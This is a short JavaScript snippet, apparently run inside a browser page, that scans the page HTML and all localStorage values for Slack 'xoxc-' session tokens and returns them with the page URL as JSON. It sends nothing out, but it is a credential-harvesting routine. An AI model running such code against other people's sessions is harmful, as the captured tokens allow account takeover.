(() => {
  const html = document.documentElement.innerHTML;
  const matches = html.match(/xoxc-[A-Za-z0-9-]+/g) || [];
  const tokens = [];
  try {
    for (let i = 0; i < localStorage.length; i++) {
      const value = localStorage.getItem(localStorage.key(i)) || '';
      tokens.push(...(value.match(/xoxc-[A-Za-z0-9-]+/g) || []));
    }
  } catch (_) {}
  return JSON.stringify({url: location.href, tokens: [...new Set([...matches, ...tokens])]});
})()
